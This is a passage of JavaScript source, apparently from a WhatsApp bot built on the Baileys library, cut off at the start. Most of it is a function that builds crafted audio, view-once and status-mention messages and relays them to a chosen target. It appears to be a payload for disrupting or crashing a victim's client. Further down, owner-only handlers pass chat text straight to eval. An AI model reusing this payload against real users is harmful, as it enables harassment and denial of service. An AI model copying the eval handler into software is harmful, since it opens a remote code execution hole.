    "thumbnailDirectPath": "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc?ccb=11-4&oh=01_Q5Aa1gH1uIjUUhBM0U0vDPofJhHzgvzbdY5vxcD8Oij7wRdhpA&oe=685D2385&_nc_sid=5e03e0",
    "thumbnailSha256": "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
    "thumbnailEncSha256": "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
    "annotations": [
      {
        "embeddedContent": {
          "embeddedMusic": {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "🇯🇲 𝐕𝐀𝐒𝐈𝐎𝐍 ϟ 𝐓𝐑𝐀𝐒𝐇 ...",
        title: "🇯🇲 𝐕𝐀𝐒𝐈𝐎𝐍 ϟ 𝐓𝐑𝐀𝐒𝐇 ...",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
          }
        },
        "embeddedAction": true
      }
    ]
  }
}

    const xatamusic = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
           contextInfo: {
           mentionedJid: mentionedList,
            caption: "𐍇Tredict Invictus",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
           }
        }
    };

    const msg1 = generateWAMessageFromContent(target, {
        viewOnceMessage: { message: { xataishere } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(target, xatamusic, {});
  
    for (const msg of [msg1, msg2]) {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await sock.relayMessage(target, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}           






// AKHIR CASE INI JANGAN DIUBAH
default:
if (budy.startsWith('>')) {
if (!isOwner) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}

if (budy.startsWith('<')) {
if (!isOwner) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}

}
} catch (err) {
console.log(require("util").format(err));
}
};

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
});